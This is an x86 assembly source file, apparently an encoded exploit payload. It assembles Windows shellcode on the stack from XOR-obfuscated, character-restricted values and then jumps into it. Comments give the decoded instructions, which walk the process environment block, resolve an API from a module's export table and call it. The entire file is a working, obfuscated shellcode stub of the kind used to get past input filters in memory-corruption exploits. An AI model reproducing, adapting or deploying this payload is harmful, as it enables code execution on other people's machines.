section .text

global _start
_start:
    pushad
    pushfd
register:
    push 0x21
    pop eax
    xor al , 0x21
    push eax
    pop ebx
    dec ebx
    push esp
    pop ecx
encode:
; push 0x90eb585a
    push 0x24412870
    pop eax
    xor eax, 0x4b55702a
    push eax
    push esp
    pop edx
    inc edx
    inc edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x5ac3619d
    push 0x3845505d
    pop eax
    xor eax, 0x6279313f
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    inc edx
    xor [edx], bh
; push 0xe18b9d61
    push ebx
    pop eax
    xor eax, 0x394f5c2f
    xor eax, 0x273b3e4e
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0xd2ff500a
    push 0x4c703544
    pop eax
    xor eax, 0x6170654e
    push eax
    push esp
    pop edx
    inc edx
    inc edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x6ae08921
    push 0x424e2b54
    pop eax
    xor eax, 0x28515d75
    push eax
    push esp
    pop edx
    inc edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x21212124
    push 0x487e4c62
    pop eax
    xor eax, 0x695f6d46
    push eax
; push 0x2c81848d
    push ebx
    pop eax
    xor eax, 0x50384537
    xor eax, 0x7c463e45
    push eax
    push esp
    pop edx
    inc edx
    inc edx
    inc edx
    xor [edx], bh
; push 0x82846821
    push 0x4d474160
    pop eax
    xor eax, 0x303c2941
    push eax
    push esp
    pop edx
    inc edx
    inc edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x21212124
    push 0x59746850
    pop eax
    xor eax, 0x78554974
    push eax
; push 0x2c812121
    push 0x4c584a69
    pop eax
    xor eax, 0x60266b48
    push eax
    push esp
    pop edx
    inc edx
    inc edx
    xor [edx], bh
; push 0x212168da
    push 0x4965284d
    pop eax
    xor eax, 0x68444068
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0x0188148b
    push 0x2b352b23
    pop eax
    xor eax, 0x2a423f57
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    inc edx
    xor [edx], bh
; push 0x4a0c8b66
    push 0x3d464c29
    pop eax
    xor eax, 0x774a384f
    push eax
    push esp
    pop edx
    inc edx
    xor [edx], bh
; push 0x585ae075
    push 0x21605a50
    pop eax
    xor eax, 0x793a4525
    push eax
    push esp
    pop edx
    inc edx
    xor [edx], bh
; push 0x3c3e6889
    push 0x77433041
    pop eax
    xor eax, 0x4b7d5837
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0xfa81f4eb
    push ebx
    pop eax
    xor eax, 0x6d544669
    xor eax, 0x682a4d7d
    push eax
; push 0xc20111ca
    push 0x773a2a40
    pop eax
    xor eax, 0x4a3b3b75
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    inc edx
    inc edx
    xor [edx], bh
; push 0xc10774c0
    push 0x71224752
    pop eax
    xor eax, 0x4f25336d
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    inc edx
    inc edx
    xor [edx], bh
; push 0x84acd231
    push ebx
    pop eax
    xor eax, 0x3f247b6f
    xor eax, 0x4477565e
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0xc031de01
    push 0x596a6a23
    pop eax
    xor eax, 0x665b4b22
    push eax
    push esp
    pop edx
    inc edx
    xor [edx], bh
    inc edx
    inc edx
    xor [edx], bh
; push 0x8f348b49
    push 0x38462b2e
    pop eax
    xor eax, 0x48725f67
    push eax
    push esp
    pop edx
    inc edx
    xor [edx], bh
    inc edx
    inc edx
    xor [edx], bh
; push 0x4be352da
    push 0x626f6d6b
    pop eax
    xor eax, 0x29733f4e
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    inc edx
    xor [edx], bh
; push 0x0124528b
    push 0x60646248
    pop eax
    xor eax, 0x6140303c
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0xdf01207a
    push 0x594c7b4a
    pop eax
    xor eax, 0x794d5b30
    push eax
    push esp
    pop edx
    inc edx
    inc edx
    inc edx
    xor [edx], bh
; push 0x8b50d801
    push 0x3b296946
    pop eax
    xor eax, 0x4f794e47
    push eax
    push esp
    pop edx
    inc edx
    xor [edx], bh
    inc edx
    inc edx
    xor [edx], bh
; push 0x1c428b14
    push 0x67294c7d
    pop eax
    xor eax, 0x7b6b3869
    push eax
    push esp
    pop edx
    inc edx
    xor [edx], bh
; push 0x4a8bda01
    push 0x7c4d5472
    pop eax
    xor eax, 0x36397173
    push eax
    push esp
    pop edx
    inc edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x781a548b
    push 0x465a3a25
    pop eax
    xor eax, 0x3e406e51
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0x3c538b10
    push 0x52612279
    pop eax
    xor eax, 0x6e325669
    push eax
    push esp
    pop edx
    inc edx
    xor [edx], bh
; push 0x5b8b1b8b
    push 0x6f52665a
    pop eax
    xor eax, 0x34267d2e
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    inc edx
    xor [edx], bh
; push 0x1b8b145b
    push 0x2d5a577d
    pop eax
    xor eax, 0x362e4326
    push eax
    push esp
    pop edx
    inc edx
    inc edx
    xor [edx], bh
; push 0x8b0c5b8b
    push 0x3d712c2a
    pop eax
    xor eax, 0x497d775e
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    inc edx
    inc edx
    xor [edx], bh
; push 0x305b8b64
    push 0x47622955
    pop eax
    xor eax, 0x77395d31
    push eax
    push esp
    pop edx
    inc edx
    xor [edx], bh
; push 0xdb319c60
    push 0x5c5f3051
    pop eax
    xor eax, 0x786e5331
    push eax
    push esp
    pop edx
    inc edx
    xor [edx], bh
    inc edx
    inc edx
    xor [edx], bh
; jmp to shellcode
    jmp esp
